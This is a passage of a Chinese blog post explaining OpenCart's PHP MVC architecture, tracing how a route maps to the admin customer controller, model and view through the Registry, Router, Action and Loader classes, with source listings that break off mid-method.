前面说到这个文件主要实例化了一个register类，而这个类以继承的方式实现了一些底层MVC的架构（这些会慢慢的在后面的分析中得以诠释），Register类封装的是一个在View和Controller中进行数据交换的接口$data(在下面来源于/engine/registry.php代码中，可以在Registery类的定义中看到Registry类实际上是围绕$data变量来进行一些赋值和取值操作)，也可以把Register看成一种数据结构，它在类之间传递数据。在$data这个字典类型中的key表示的是一些变量名称，但是为了方便理解，我们更愿意称之为对象名,因为这些变量存储的数据类型很杂，包括一些底层MVC的超类，如Loader,Config,Event,Language,Route等等，特别是Loader与Route类，Loader类实现了对Model，Language，View，Controller等的实例化，而Route则提供了URL的参数路由规则（这些也会在后面有所涉及）。 12345678910111213141516final class Registry &#123; private $data = array(); public function get($key) &#123; return (isset($this-&gt;data[$key]) ? $this-&gt;data[$key] : null); &#125; public function set($key, $value) &#123; $this-&gt;data[$key] = $value; &#125; public function has($key) &#123; return isset($this-&gt;data[$key]); &#125;&#125; 很好，那么到了这里，我们可以回头看下我们如果访问http://localhost/OpenCart/upload/admin/index.php?route=customer/customer&amp;user_token=S9dNbDGlubJVFpjFllGyYfgg9BCdoCCr中index.php中的相关后台运行原理已经解释得差不多了，那么route参数后的一堆东西，后台是如何处理的呢？这里就需要知道web框架MVC思想中的Route规则。首先来谈下为何需要这个路由，因为MVC中的C是十分重要的，负责处理用户请求，载入Model获取数据，然后通过$data接口交付给View,然后由渲染引擎，在这里是twig进行网页的渲染。而在众多的业务逻辑里面（我们可以在admin/controller目录中看到很多的controller），怎么通过URL来实现对不同业务的特定controller的处理一一对应？这时route规则应运而生。所以现在我们就来看下与route规则紧密相关的两个引擎源文件，system/engine/router.php和system/engine/action.php。首先来看下router.php:1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpfinal class Router &#123; private $registry; private $pre_action = array(); private $error; public function __construct($registry) &#123; $this-&gt;registry = $registry; &#125; public function addPreAction(Action $pre_action) &#123; $this-&gt;pre_action[] = $pre_action; &#125; public function dispatch(Action $action, Action $error) &#123; $this-&gt;error = $error; foreach ($this-&gt;pre_action as $pre_action) &#123; $result = $this-&gt;execute($pre_action); if ($result instanceof Action) &#123; $action = $result; break; &#125; &#125; while ($action instanceof Action) &#123; $action = $this-&gt;execute($action); &#125; &#125; private function execute(Action $action) &#123; $result = $action-&gt;execute($this-&gt;registry); if ($result instanceof Action) &#123; return $result; &#125; if ($result instanceof Exception) &#123; $action = $this-&gt;error; $this-&gt;error = null; return $action; &#125; &#125;&#125; 这个文件其实把很多的实现细节放在了action.php,所以我们重点来看action.php,以上的代码作为参考阅读。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phpclass Action &#123; private $id; private $route; private $method = 'index'; public function __construct($route) &#123; $this-&gt;id = $route; $parts = explode('/', preg_replace('/[^a-zA-Z0-9_\/]/', '', (string)$route)); // Break apart the route while ($parts) &#123; $file = DIR_APPLICATION . 'controller/' . implode('/', $parts) . '.php'; if (is_file($file)) &#123; $this-&gt;route = implode('/', $parts); break; &#125; else &#123; $this-&gt;method = array_pop($parts); &#125; &#125; &#125; public function getId() &#123; return $this-&gt;id; &#125; public function execute($registry, array $args = array()) &#123; // Stop any magical methods being called if (substr($this-&gt;method, 0, 2) == '__') &#123; return new \Exception('Error: Calls to magic methods are not allowed!'); &#125; $file = DIR_APPLICATION . 'controller/' . $this-&gt;route . '.php'; $class = 'Controller' . preg_replace('/[^a-zA-Z0-9]/', '', $this-&gt;route); // Initialize the class if (is_file($file)) &#123; include_once($file); $controller = new $class($registry); &#125; else &#123; return new \Exception('Error: Could not call ' . $this-&gt;route . '/' . $this-&gt;method . '!'); &#125; $reflection = new ReflectionClass($class); if ($reflection-&gt;hasMethod($this-&gt;method) &amp;&amp; $reflection-&gt;getMethod($this-&gt;method)-&gt;getNumberOfRequiredParameters() &lt;= count($args)) &#123; return call_user_func_array(array($controller, $this-&gt;method), $args); &#125; else &#123; return new \Exception('Error: Could not call ' . $this-&gt;route . '/' . $this-&gt;method . '!'); &#125; &#125;&#125; 其实不必要把整个架构的细节都给看完，因为其中涉及了比较多的校验和错误捕捉和处理。所以以上代码实际处理业务的部分就是router后参数的拆分，然后进行一些校验，合格的话就去include一个controller类然后实例化它，最后以拆分好的形式传入call_user_func_array。其实拆分的原则就是通过router参数以/进行拆分，然后字符串连接，到admin的相应文件夹下去获取相应类的文件路径。在这里?route=customer/customer其实就是调用customer/customer.php文件里定义的类，然后通过$controller = new $class($registry);实例化它。然后就是条用call_func_array来执行controller类里面的method，传入的参数为$args，这里有个点就是在默认的情况下，调用的方法为index。接下来我们就要进入admin/contorller/customer/customer.php一探究竟，弄个清楚到底这个controller处理了哪些业务逻辑以及如何和Model，View进行交互。 123456789101112131415&lt;?phpclass ControllerCustomerCustomer extends Controller &#123; private $error = array(); public function index() &#123; $this-&gt;load-&gt;language(&apos;customer/customer&apos;); $this-&gt;document-&gt;setTitle($this-&gt;language-&gt;get(&apos;heading_title&apos;)); $this-&gt;load-&gt;model(&apos;customer/customer&apos;); $this-&gt;getList(); &#125;...... 这个文件内容比较多，不太适合全部copy到这里来进行分析，但是通过ControllerCustomerCustomer类的一些方法举例来阐述MVC的概念就可以起到不错的分析效果。当然在深入解析这个过程的时候，我们首先需要理解一下$this-&gt;load方法的实现原理。了解过面像对象编程的兄弟可能一时无法理解基类没有load方法，而本类也没有实现该方法，那么这个方法是如何得以调用实现的呢？先不急，我们先来看个比较神奇的php魔术方法举例：1234567891011121314&lt;?phpclass test&#123; public $a='h'; public function test()&#123; $c='hello'; &#125; function __get($key)&#123; echo $key; &#125; &#125;&#125;$b=new test();$b-&gt;load;?&gt; 试想一下，运行这段代码，我们会得到什么结果？答案是:load。是的，在调用一个不存在的或者没有访问权限的对象的时候，类会主动调用get().方法，而load就会作为参数传入get()函数。那么举这个例子和我们理解上面代码有什么关系呢？我们可以看到Controller基类的代码实现如下：123456789101112131415abstract class Controller &#123; protected $registry; public function __construct($registry) &#123; $this-&gt;registry = $registry; &#125; public function __get($key) &#123; return $this-&gt;registry-&gt;get($key); &#125; public function __set($key, $value) &#123; $this-&gt;registry-&gt;set($key, $value); &#125;&#125; 是的同样实现了__get()方法，这样我们就会调用它，最后他会返回一个registry-&gt;get(“load”)传回的对象，参考上面的Register类的定义以及framework.php的注册变量过程，我们可以发现，这里其实返回的是一个Loader对象，而Loader对象的定义如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495final class Loader &#123; protected $registry; /** * Constructor * * @param object $registry */ public function __construct($registry) &#123; $this-&gt;registry = $registry; &#125; public function controller($route) &#123; $args = func_get_args(); array_shift($args); // Sanitize the call $route = preg_replace('/[^a-zA-Z0-9_\/]/', '', (string)$route); // Keep the original trigger $trigger = $route; // Trigger the pre events $result = $this-&gt;registry-&gt;get('event')-&gt;trigger('controller/' . $trigger . '/before', array(&amp;$route, &amp;$args)); // Make sure its only the last event that returns an output if required. if ($result != null &amp;&amp; !$result instanceof Exception) &#123; $output = $result; &#125; else &#123; $action = new Action($route); $output = $action-&gt;execute($this-&gt;registry, $args); &#125; // Trigger the post events $result = $this-&gt;registry-&gt;get('event')-&gt;trigger('controller/' . $trigger . '/after', array(&amp;$route, &amp;$args, &amp;$output)); if ($result &amp;&amp; !$result instanceof Exception) &#123; $output = $result; &#125; if (!$output instanceof Exception) &#123; return $output; &#125; &#125; public function model($route) &#123; // Sanitize the call $route = preg_replace('/[^a-zA-Z0-9_\/]/', '', (string)$route); if (!$this-&gt;registry-&gt;has('model_' . str_replace('/', '_', $route))) &#123; $file = DIR_APPLICATION . 'model/' . $route . '.php'; $class = 'Model' . preg_replace('/[^a-zA-Z0-9]/', '', $route); if (is_file($file)) &#123; include_once($file); $proxy = new Proxy(); // Overriding models is a little harder so we have to use PHP's magic methods // In future version we can use runkit foreach (get_class_methods($class) as $method) &#123; $proxy-&gt;&#123;$method&#125; = $this-&gt;callback($route . '/' . $method); &#125; $this-&gt;registry-&gt;set('model_' . str_replace('/', '_', (string)$route), $proxy); &#125; else &#123; throw new \Exception('Error: Could not load model ' . $route . '!'); &#125; &#125; &#125; public function view($route, $data = array()) &#123; // Sanitize the call $route = preg_replace('/[^a-zA-Z0-9_\/]/', '', (string)$route); // Keep the original trigger $trigger = $route; $template = new Template($this-&gt;registry-&gt;get('config')-&gt;get('template_engine')); // Trigger the pre events $result = $this-&gt;registry-&gt;get('event')-&gt;trigger('view/' . $trigger . '/before', array(&amp;$route, &amp;$data, &amp;$template)); // Make sure its only the last event that returns an output if required. if ($result &amp;&amp; !$result instanceof Exception) &#123; $output = $result; &#125; else &#123; foreach ($data as $key =&gt; $value) &#123; $template-&gt;set($key, $value); &#125; $output = $template-&gt;render($this-&gt;registry-&gt;get('config')-&gt;get('template_directory') . $route, $this-&gt;registry-&gt;get('config')-&gt;get('template_cache')); &#125;...... 所以到这里就可以大致了解load方法调用的本质。所以说Loader是和Router类是在MVC架构中十分重要的两个组件。理解到这里，我们就来继续看下ControllerCustomerCustomer类的具体实现，了解它和view,modle的交互。通过下图可以看到整个ControllerCustomerCustomer 的代码量比较大，为了理解MVC没有必要把每一个方法的实现都理解透彻，我们可以举几个比较典型的方法的实现来阐述MVC的实现过程。 为了演示，在前端界面我们点击edit图标，可以看到对应的url参数有了变化,变成了localhost/OpenCart/upload/admin/index.php?route=customer/customer/edit&amp;user_token=QcODkXWS5tEYdqb03TXRXdqgzsoaGAMp&amp;customer_id=1,同样的界面变化如下： 根据我们之前的了解，这里是调用了ControllerCustomerCustomer类的edit方法，而edit方法的实现代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public function edit() &#123; $this-&gt;load-&gt;language('customer/customer'); $this-&gt;document-&gt;setTitle($this-&gt;language-&gt;get('heading_title')); $this-&gt;load-&gt;model('customer/customer'); if (($this-&gt;request-&gt;server['REQUEST_METHOD'] == 'POST') &amp;&amp; $this-&gt;validateForm()) &#123; $this-&gt;model_customer_customer-&gt;editCustomer($this-&gt;request-&gt;get['customer_id'], $this-&gt;request-&gt;post); $this-&gt;session-&gt;data['success'] = $this-&gt;language-&gt;get('text_success'); $url = ''; if (isset($this-&gt;request-&gt;get['filter_name'])) &#123; $url .= '&amp;filter_name=' . urlencode(html_entity_decode($this-&gt;request-&gt;get['filter_name'], ENT_QUOTES, 'UTF-8')); &#125; if (isset($this-&gt;request-&gt;get['filter_email'])) &#123; $url .= '&amp;filter_email=' . urlencode(html_entity_decode($this-&gt;request-&gt;get['filter_email'], ENT_QUOTES, 'UTF-8')); &#125; if (isset($this-&gt;request-&gt;get['filter_customer_group_id'])) &#123; $url .= '&amp;filter_customer_group_id=' . $this-&gt;request-&gt;get['filter_customer_group_id']; &#125; if (isset($this-&gt;request-&gt;get['filter_status'])) &#123; $url .= '&amp;filter_status=' . $this-&gt;request-&gt;get['filter_status']; &#125; if (isset($this-&gt;request-&gt;get['filter_ip'])) &#123; $url .= '&amp;filter_ip=' . $this-&gt;request-&gt;get['filter_ip']; &#125; if (isset($this-&gt;request-&gt;get['filter_date_added'])) &#123; $url .= '&amp;filter_date_added=' . $this-&gt;request-&gt;get['filter_date_added']; &#125; if (isset($this-&gt;request-&gt;get['sort'])) &#123; $url .= '&amp;sort=' . $this-&gt;request-&gt;get['sort']; &#125; if (isset($this-&gt;request-&gt;get['order'])) &#123; $url .= '&amp;order=' . $this-&gt;request-&gt;get['order']; &#125; if (isset($this-&gt;request-&gt;get['page'])) &#123; $url .= '&amp;page=' . $this-&gt;request-&gt;get['page']; &#125; $this-&gt;response-&gt;redirect($this-&gt;url-&gt;link('customer/customer', 'user_token=' . $this-&gt;session-&gt;data['user_token'] . $url)); &#125; $this-&gt;getForm(); &#125; 可以看到在这个函数中加载了model_customer_customer这个Model接口来进行相关的数据查询（至于为啥是这样一个方法，这是一个开发时候的规定，通过特定的方法来实现Model中ModelCustomerCustomer映射成为controller里面的类model_customer_customer），然后其他的一些逻辑是通过获取post,get获取的参数做一些逻辑判断（这一部分的代码实现在system/library里面，有兴趣的可以自己去看下，post,get,session等的底层封装实现），最后调用了getFrom的方法来实现与View的连接。另外需要注意的是，在opencart中除了MVC外还有个L部分，就是language。所谓的language就是一些需要在不同业务逻辑中显示在客户端的语句，这里也单独进行了分离编写，通过$this-&gt;load-&gt;language(‘customer/customer’)调用。在这里admin/language/customer/customer/customer.php language的内容如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889&lt;?php// Heading$_[&apos;heading_title&apos;] = &apos;Customers&apos;;// Text$_[&apos;text_success&apos;] = &apos;Success: You have modified customers!&apos;;$_[&apos;text_list&apos;] = &apos;Customer List&apos;;$_[&apos;text_add&apos;] = &apos;Add Customer&apos;;$_[&apos;text_edit&apos;] = &apos;Edit Customer&apos;;$_[&apos;text_default&apos;] = &apos;Default&apos;;$_[&apos;text_account&apos;] = &apos;Customer Details&apos;;$_[&apos;text_password&apos;] = &apos;Password&apos;;$_[&apos;text_other&apos;] = &apos;Other&apos;;$_[&apos;text_balance&apos;] = &apos;Balance&apos;;$_[&apos;text_address&apos;] = &apos;Address&apos;;$_[&apos;text_history&apos;] = &apos;History&apos;;$_[&apos;text_history_add&apos;] = &apos;Add History&apos;;$_[&apos;text_transaction&apos;] = &apos;Transactions&apos;;$_[&apos;text_transaction_add&apos;] = &apos;Add Transaction&apos;;$_[&apos;text_reward&apos;] = &apos;Reward Points&apos;;$_[&apos;text_reward_add&apos;] = &apos;Add Reward Points&apos;;$_[&apos;text_ip&apos;] = &apos;IP&apos;;$_[&apos;text_option&apos;] = &apos;Options&apos;;$_[&apos;text_login&apos;] = &apos;Login into Store&apos;;$_[&apos;text_unlock&apos;] = &apos;Unlock Account&apos;;// Column$_[&apos;column_name&apos;] = &apos;Customer Name&apos;;$_[&apos;column_email&apos;] = &apos;E-Mail&apos;;$_[&apos;column_customer_group&apos;] = &apos;Customer Group&apos;;$_[&apos;column_status&apos;] = &apos;Status&apos;;$_[&apos;column_date_added&apos;] = &apos;Date Added&apos;;$_[&apos;column_comment&apos;] = &apos;Comment&apos;;$_[&apos;column_description&apos;] = &apos;Description&apos;;$_[&apos;column_amount&apos;] = &apos;Amount&apos;;$_[&apos;column_points&apos;] = &apos;Points&apos;;$_[&apos;column_ip&apos;] = &apos;IP&apos;;$_[&apos;column_account&apos;] = &apos;Accounts&apos;;$_[&apos;column_store&apos;] = &apos;Store&apos;;$_[&apos;column_country&apos;] = &apos;Country&apos;;$_[&apos;column_action&apos;] = &apos;Action&apos;;// Entry$_[&apos;entry_customer_group&apos;] = &apos;Customer Group&apos;;$_[&apos;entry_firstname&apos;] = &apos;First Name&apos;;$_[&apos;entry_lastname&apos;] = &apos;Last Name&apos;;$_[&apos;entry_email&apos;] = &apos;E-Mail&apos;;$_[&apos;entry_telephone&apos;] = &apos;Telephone&apos;;$_[&apos;entry_newsletter&apos;] = &apos;Newsletter&apos;;$_[&apos;entry_status&apos;] = &apos;Status&apos;;$_[&apos;entry_safe&apos;] = &apos;Safe&apos;;$_[&apos;entry_password&apos;] = &apos;Password&apos;;$_[&apos;entry_confirm&apos;] = &apos;Confirm&apos;;$_[&apos;entry_company&apos;] = &apos;Company&apos;;$_[&apos;entry_address_1&apos;] = &apos;Address 1&apos;;$_[&apos;entry_address_2&apos;] = &apos;Address 2&apos;;$_[&apos;entry_city&apos;] = &apos;City&apos;;$_[&apos;entry_postcode&apos;] = &apos;Postcode&apos;;$_[&apos;entry_country&apos;] = &apos;Country&apos;;$_[&apos;entry_zone&apos;] = &apos;Region / State&apos;;$_[&apos;entry_default&apos;] = &apos;Default Address&apos;;$_[&apos;entry_comment&apos;] = &apos;Comment&apos;;$_[&apos;entry_description&apos;] = &apos;Description&apos;;$_[&apos;entry_amount&apos;] = &apos;Amount&apos;;$_[&apos;entry_points&apos;] = &apos;Points&apos;;$_[&apos;entry_name&apos;] = &apos;Customer Name&apos;;$_[&apos;entry_ip&apos;] = &apos;IP&apos;;$_[&apos;entry_date_added&apos;] = &apos;Date Added&apos;;// Help$_[&apos;help_safe&apos;] = &apos;Set to true to avoid this customer from being caught by the anti-fraud system&apos;;$_[&apos;help_points&apos;] = &apos;Use minus to remove points&apos;;// Error$_[&apos;error_warning&apos;] = &apos;Warning: Please check the form carefully for errors!&apos;;$_[&apos;error_permission&apos;] = &apos;Warning: You do not have permission to modify customers!&apos;;$_[&apos;error_exists&apos;] = &apos;Warning: E-Mail Address is already registered!&apos;;$_[&apos;error_firstname&apos;] = &apos;First Name must be between 1 and 32 characters!&apos;;$_[&apos;error_lastname&apos;] = &apos;Last Name must be between 1 and 32 characters!&apos;;$_[&apos;error_email&apos;] = &apos;E-Mail Address does not appear to be valid!&apos;;$_[&apos;error_telephone&apos;] = &apos;Telephone must be between 3 and 32 characters!&apos;;$_[&apos;error_password&apos;] = &apos;Password must be between 4 and 20 characters!&apos;;$_[&apos;error_confirm&apos;] = &apos;Password and password confirmation do not match!&apos;;$_[&apos;error_address_1&apos;] = &apos;Address 1 must be between 3 and 128 characters!&apos;;$_[&apos;error_city&apos;] = &apos;City must be between 2 and 128 characters!&apos;;$_[&apos;error_postcode&apos;] = &apos;Postcode must be between 2 and 10 characters for this country!&apos;;$_[&apos;error_country&apos;] = &apos;Please select a country!&apos;;$_[&apos;error_zone&apos;] = &apos;Please select a region / state!&apos;;$_[&apos;error_custom_field&apos;] = &apos;%s required!&apos;; 接下来我们会进入到ModelCustomerCustomer，查看editCustomer方法： 123456789101112131415161718192021public function editCustomer($customer_id, $data) &#123; $this-&gt;db-&gt;query("UPDATE " . DB_PREFIX . "customer SET customer_group_id = '" . (int)$data['customer_group_id'] . "', firstname = '" . $this-&gt;db-&gt;escape((string)$data['firstname']) . "', lastname = '" . $this-&gt;db-&gt;escape((string)$data['lastname']) . "', email = '" . $this-&gt;db-&gt;escape((string)$data['email']) . "', telephone = '" . $this-&gt;db-&gt;escape((string)$data['telephone']) . "', custom_field = '" . $this-&gt;db-&gt;escape(isset($data['custom_field']) ? json_encode($data['custom_field']) : json_encode(array())) . "', newsletter = '" . (int)$data['newsletter'] . "', status = '" . (int)$data['status'] . "', safe = '" . (int)$data['safe'] . "' WHERE customer_id = '" . (int)$customer_id . "'"); if ($data['password']) &#123; $this-&gt;db-&gt;query("UPDATE " . DB_PREFIX . "customer SET salt = '', password = '" . $this-&gt;db-&gt;escape(password_hash($data['password'], PASSWORD_DEFAULT)) . "' WHERE customer_id = '" . (int)$customer_id . "'"); &#125; $this-&gt;db-&gt;query("DELETE FROM " . DB_PREFIX . "address WHERE customer_id = '" . (int)$customer_id . "'"); if (isset($data['address'])) &#123; foreach ($data['address'] as $key =&gt; $address) &#123; $this-&gt;db-&gt;query("INSERT INTO " . DB_PREFIX . "address SET address_id = '" . (int)$address['address_id'] . "', customer_id = '" . (int)$customer_id . "', firstname = '" . $this-&gt;db-&gt;escape($address['firstname']) . "', lastname = '" . $this-&gt;db-&gt;escape($address['lastname']) . "', company = '" . $this-&gt;db-&gt;escape($address['company']) . "', address_1 = '" . $this-&gt;db-&gt;escape($address['address_1']) . "', address_2 = '" . $this-&gt;db-&gt;escape($address['address_2']) . "', city = '" . $this-&gt;db-&gt;escape($address['city']) . "', postcode = '" . $this-&gt;db-&gt;escape($address['postcode']) . "', country_id = '" . (int)$address['country_id'] . "', zone_id = '" . (int)$address['zone_id'] . "', custom_field = '" . $this-&gt;db-&gt;escape(isset($address['custom_field']) ? json_encode($address['custom_field']) : json_encode(array())) . "'"); if (isset($data['default']) &amp;&amp; $data['default'] == $key) &#123; $address_id = $this-&gt;db-&gt;getLastId(); $this-&gt;db-&gt;query("UPDATE " . DB_PREFIX . "customer SET address_id = '" . (int)$address_id . "' WHERE customer_id = '" . (int)$customer_id . "'"); &#125; &#125; &#125; &#125; 可以很清晰的看到，是一大堆的字符串与变量连接的sql语句，所以说Model部分是完全负责与数据库的交互，只要和Controller定义了接口，也就是每个函数的传参规定，就可以从业务逻辑和前端渲染完全脱离开来进行开发。当然这部分的安全是需要时刻小心的。可以看到上面的用户可用参数都运用了escape函数来进行过滤处理，降低sql注入的风险。由于我们分析的是修改操作，所以在Model这边没有回传数据，只是默默地对数据库进行update操作。现在我们看完了CM（controller和Model）,接着就是理解Controller是如何和View进行操作的。我们将看到ControllerCustomerCustomer类中的getForm方法的实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289protected function getForm() &#123; $data['text_form'] = !isset($this-&gt;request-&gt;get['customer_id']) ? $this-&gt;language-&gt;get('text_add') : $this-&gt;language-&gt;get('text_edit'); $data['user_token'] = $this-&gt;session-&gt;data['user_token']; if (isset($this-&gt;request-&gt;get['customer_id'])) &#123; $data['customer_id'] = (int)$this-&gt;request-&gt;get['customer_id']; &#125; else &#123; $data['customer_id'] = 0; &#125; if (isset($this-&gt;error['warning'])) &#123; $data['error_warning'] = $this-&gt;error['warning']; &#125; else &#123; $data['error_warning'] = ''; &#125; if (isset($this-&gt;error['firstname'])) &#123; $data['error_firstname'] = $this-&gt;error['firstname']; &#125; else &#123; $data['error_firstname'] = ''; &#125; if (isset($this-&gt;error['lastname'])) &#123; $data['error_lastname'] = $this-&gt;error['lastname']; &#125; else &#123; $data['error_lastname'] = ''; &#125; if (isset($this-&gt;error['email'])) &#123; $data['error_email'] = $this-&gt;error['email']; &#125; else &#123; $data['error_email'] = ''; &#125; if (isset($this-&gt;error['telephone'])) &#123; $data['error_telephone'] = $this-&gt;error['telephone']; &#125; else &#123; $data['error_telephone'] = ''; &#125; if (isset($this-&gt;error['cheque'])) &#123; $data['error_cheque'] = $this-&gt;error['cheque']; &#125; else &#123; $data['error_cheque'] = ''; &#125; if (isset($this-&gt;error['paypal'])) &#123; $data['error_paypal'] = $this-&gt;error['paypal']; &#125; else &#123; $data['error_paypal'] = ''; &#125; if (isset($this-&gt;error['bank_account_name'])) &#123; $data['error_bank_account_name'] = $this-&gt;error['bank_account_name']; &#125; else &#123; $data['error_bank_account_name'] = ''; &#125; if (isset($this-&gt;error['bank_account_number'])) &#123; $data['error_bank_account_number'] = $this-&gt;error['bank_account_number']; &#125; else &#123; $data['error_bank_account_number'] = ''; &#125; if (isset($this-&gt;error['password'])) &#123; $data['error_password'] = $this-&gt;error['password']; &#125; else &#123; $data['error_password'] = ''; &#125; if (isset($this-&gt;error['confirm'])) &#123; $data['error_confirm'] = $this-&gt;error['confirm']; &#125; else &#123; $data['error_confirm'] = ''; &#125; if (isset($this-&gt;error['custom_field'])) &#123; $data['error_custom_field'] = $this-&gt;error['custom_field']; &#125; else &#123; $data['error_custom_field'] = array(); &#125; if (isset($this-&gt;error['address'])) &#123; $data['error_address'] = $this-&gt;error['address']; &#125; else &#123; $data['error_address'] = array(); &#125; $url = ''; if (isset($this-&gt;request-&gt;get['filter_name'])) &#123; $url .= '&amp;filter_name=' . urlencode(html_entity_decode($this-&gt;request-&gt;get['filter_name'], ENT_QUOTES, 'UTF-8')); &#125; if (isset($this-&gt;request-&gt;get['filter_email'])) &#123; $url .= '&amp;filter_email=' . urlencode(html_entity_decode($this-&gt;request-&gt;get['filter_email'], ENT_QUOTES, 'UTF-8')); &#125; if (isset($this-&gt;request-&gt;get['filter_customer_group_id'])) &#123; $url .= '&amp;filter_customer_group_id=' . $this-&gt;request-&gt;get['filter_customer_group_id']; &#125; if (isset($this-&gt;request-&gt;get['filter_status'])) &#123; $url .= '&amp;filter_status=' . $this-&gt;request-&gt;get['filter_status']; &#125; if (isset($this-&gt;request-&gt;get['filter_ip'])) &#123; $url .= '&amp;filter_ip=' . $this-&gt;request-&gt;get['filter_ip']; &#125; if (isset($this-&gt;request-&gt;get['filter_date_added'])) &#123; $url .= '&amp;filter_date_added=' . $this-&gt;request-&gt;get['filter_date_added']; &#125; if (isset($this-&gt;request-&gt;get['sort'])) &#123; $url .= '&amp;sort=' . $this-&gt;request-&gt;get['sort']; &#125; if (isset($this-&gt;request-&gt;get['order'])) &#123; $url .= '&amp;order=' . $this-&gt;request-&gt;get['order']; &#125; if (isset($this-&gt;request-&gt;get['page'])) &#123; $url .= '&amp;page=' . $this-&gt;request-&gt;get['page']; &#125; $data['breadcrumbs'] = array(); $data['breadcrumbs'][] = array( 'text' =&gt; $this-&gt;language-&gt;get('text_home'), 'href' =&gt; $this-&gt;url-&gt;link('common/dashboard', 'user_token=' . $this-&gt;session-&gt;data['user_token']) ); $data['breadcrumbs'][] = array( 'text' =&gt; $this-&gt;language-&gt;get('heading_title'), 'href' =&gt; $this-&gt;url-&gt;link('customer/customer', 'user_token=' . $this-&gt;session-&gt;data['user_token'] . $url) ); if (!isset($this-&gt;request-&gt;get['customer_id'])) &#123; $data['action'] = $this-&gt;url-&gt;link('customer/customer/add', 'user_token=' . $this-&gt;session-&gt;data['user_token'] . $url); &#125; else &#123; $data['action'] = $this-&gt;url-&gt;link('customer/customer/edit', 'user_token=' . $this-&gt;session-&gt;data['user_token'] . '&amp;customer_id=' . $this-&gt;request-&gt;get['customer_id'] . $url); &#125; $data['cancel'] = $this-&gt;url-&gt;link('customer/customer', 'user_token=' . $this-&gt;session-&gt;data['user_token'] . $url); if (isset($this-&gt;request-&gt;get['customer_id']) &amp;&amp; ($this-&gt;request-&gt;server['REQUEST_METHOD'] != 'POST')) &#123; $customer_info = $this-&gt;model_customer_customer-&gt;getCustomer($this-&gt;request-&gt;get['customer_id']); &#125; $this-&gt;load-&gt;model('customer/customer_group'); $data['customer_groups'] = $this-&gt;model_customer_customer_group-&gt;getCustomerGroups(); if (isset($this-&gt;request-&gt;post['customer_group_id'])) &#123; $data['customer_group_id'] = $this-&gt;request-&gt;post['customer_group_id']; &#125; elseif (!empty($customer_info)) &#123; $data['customer_group_id'] = $customer_info['customer_group_id']; &#125; else &#123; $data['customer_group_id'] = $this-&gt;config-&gt;get('config_customer_group_id'); &#125; if (isset($this-&gt;request-&gt;post['firstname'])) &#123; $data['firstname'] = $this-&gt;request-&gt;post['firstname']; &#125; elseif (!empty($customer_info)) &#123; $data['firstname'] = $customer_info['firstname']; &#125; else &#123; $data['firstname'] = ''; &#125; if (isset($this-&gt;request-&gt;post['lastname'])) &#123; $data['lastname'] = $this-&gt;request-&gt;post['lastname']; &#125; elseif (!empty($customer_info)) &#123; $data['lastname'] = $customer_info['lastname']; &#125; else &#123; $data['lastname'] = ''; &#125; if (isset($this-&gt;request-&gt;post['email'])) &#123; $data['email'] = $this-&gt;request-&gt;post['email']; &#125; elseif (!empty($customer_info)) &#123; $data['email'] = $customer_info['email']; &#125; else &#123; $data['email'] = ''; &#125; if (isset($this-&gt;request-&gt;post['telephone'])) &#123; $data['telephone'] = $this-&gt;request-&gt;post['telephone']; &#125; elseif (!empty($customer_info)) &#123; $data['telephone'] = $customer_info['telephone']; &#125; else &#123; $data['telephone'] = ''; &#125; // Custom Fields $this-&gt;load-&gt;model('customer/custom_field'); $data['custom_fields'] = array(); $filter_data = array( 'sort' =&gt; 'cf.sort_order', 'order' =&gt; 'ASC' ); $custom_fields = $this-&gt;model_customer_custom_field-&gt;getCustomFields($filter_data); foreach ($custom_fields as $custom_field) &#123; $data['custom_fields'][] = array( 'custom_field_id' =&gt; $custom_field['custom_field_id'], 'custom_field_value' =&gt; $this-&gt;model_customer_custom_field-&gt;getCustomFieldValues($custom_field['custom_field_id']), 'name' =&gt; $custom_field['name'], 'value' =&gt; $custom_field['value'], 'type' =&gt; $custom_field['type'], 'location' =&gt; $custom_field['location'], 'sort_order' =&gt; $custom_field['sort_order'] ); &#125; if (isset($this-&gt;request-&gt;post['custom_field'])) &#123; $data['account_custom_field'] = $this-&gt;request-&gt;post['custom_field']; &#125; elseif (!empty($customer_info)) &#123; $data['account_custom_field'] = json_decode($customer_info['custom_field'], true); &#125; else &#123; $data['account_custom_field'] = array(); &#125; if (isset($this-&gt;request-&gt;post['newsletter'])) &#123; $data['newsletter'] = $this-&gt;request-&gt;post['newsletter']; &#125; elseif (!empty($customer_info)) &#123; $data['newsletter'] = $customer_info['newsletter']; &#125; else &#123; $data['newsletter'] = ''; &#125; if (isset($this-&gt;request-&gt;post['status'])) &#123; $data['status'] = $this-&gt;request-&gt;post['status']; &#125; elseif (!empty($customer_info)) &#123; $data['status'] = $customer_info['status']; &#125; else &#123; $data['status'] = true; &#125; if (isset($this-&gt;request-&gt;post['safe'])) &#123; $data['safe'] = $this-&gt;request-&gt;post['safe']; &#125; elseif (!empty($customer_info)) &#123; $data['safe'] = $customer_info['safe']; &#125; else &#123; $data['safe'] = 0; &#125; if (isset($this-&gt;request-&gt;post['password'])) &#123; $data['password'] = $this-&gt;request-&gt;post['password']; &#125; else &#123; $data['password'] = ''; &#125; if (isset($this-&gt;request-&gt;post['confirm'])) &#123; $data['confirm'] = $this-&gt;request-&gt;post['confirm']; &#125; else &#123; $data['confirm'] = ''; &#125; $this-&gt;load-&gt;model('localisation/country'); $data['countries'] = $this-&gt;model_localisation_country-&gt;getCountries(); if (isset($this-&gt;request-&gt;post['address'])) &#123; $data['addresses'] = $this-&gt;request-&gt;post['address']; &#125; elseif (isset($this-&gt;request-&gt;get['customer_id'])) &#123; $data['addresses'] = $this-&gt;model_customer_customer-&gt;getAddresses($this-&gt;request-&gt;get['customer_id']); &#125; else 